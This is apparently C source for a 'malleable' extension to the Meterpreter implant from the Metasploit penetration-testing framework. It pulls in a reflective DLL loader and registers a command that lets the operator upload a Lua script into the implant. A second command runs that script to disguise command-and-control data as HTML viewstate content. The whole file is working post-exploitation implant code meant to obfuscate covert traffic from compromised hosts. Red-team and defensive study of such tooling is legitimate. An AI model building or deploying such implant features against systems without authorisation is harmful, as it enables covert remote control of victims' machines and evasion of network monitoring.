/*!
 * @file malleable.c
 * @brief Entry point and intialisation functionality for the malleable extention.
 */
#include "../../common/common.h"
#include "malleable.h"
#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

DWORD test(Remote *remote, Packet *packet);
DWORD setScript(Remote *remote, Packet *packet);

static char * luaScript = "function encrypt(s);s = '<html> viewstate0=\"' ..s ..  '\" </html>';return s;end;";

Command customCommands[] =
{
	COMMAND_REQ("malleable_test_command", test),
	COMMAND_REQ("malleable_set_script", setScript),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	dprintf("MALLEABLE] Initializing malleable extension");
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	dprintf("MALLEABLE] De-initializing malleable extension");
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

void bail(lua_State *L, char *msg){
	dprintf("[MALLEABLE] FATAL ERROR:  %s: %s",
		msg, lua_tostring(L, -1));
}

DWORD setScript(Remote *remote, Packet *packet)
{
	dprintf("[MALLEABLE] Executing set script command");
	// Recieve Script
	char * recievedScript = packet_get_tlv_value_string(packet, TLV_TYPE_MALLEABLE_INTERFACES);
	dprintf("[MALLEABLE] Recieved and setting script: \"%s\"", recievedScript);
	luaScript = _strdup(recievedScript);
	// Send response
	Packet *response = packet_create_response(packet);
	int result = ERROR_SUCCESS;
	packet_add_tlv_string(response, TLV_TYPE_MALLEABLE_INTERFACES, "New script set");
	packet_transmit_response(result, remote, response);
	dprintf("[MALLEABLE] Finished set script command");
	return ERROR_SUCCESS;
}

DWORD test(Remote *remote, Packet *packet)
{
	dprintf("[MALLEABLE] testCommandStart");
	dprintf("[TMPTMPTMPTMP] in script1: %s", luaScript);
	lua_State *L;

	L = luaL_newstate();                        /* Create Lua state variable */
	luaL_openlibs(L);                           /* Load Lua libraries */
	dprintf("[MALLEABLE] luaL_loadstring(): script: \"%s\"", luaScript);
	if (luaL_loadstring(L, luaScript)) /* Load but don't run the Lua script */
		bail(L, "luaL_loadstring() failed");      /* Error out if file can't be read */
	dprintf("[MALLEABLE] lua_pcall(0,0,0) (init)");
	if (lua_pcall(L, 0, 0, 0))                  /* PRIMING RUN. FORGET THIS AND YOU'RE TOAST */
		bail(L, "lua_pcall() failed");          /* Error out if Lua file has an error */

	lua_getglobal(L, "encrypt");
	lua_pushstring(L, "evilMeterpreterData");
	dprintf("[MALLEABLE] lua_pcall() (encrypt)");
	if (lua_pcall(L, 1, 1, 0))
		bail(L, "lua_pcall() failed");
	const char *encryptedOut = lua_tostring(L, -1);
	dprintf("Got \"%s\" back from lua_tostring()", encryptedOut);

	Packet *response = packet_create_response(packet);
	int result = ERROR_SUCCESS;
	packet_add_tlv_string(response, TLV_TYPE_MALLEABLE_INTERFACES, encryptedOut);
	packet_transmit_response(result, remote, response);
	lua_close(L);
	dprintf("[MALLEABLE] testCommandEnd");
	return ERROR_SUCCESS;
}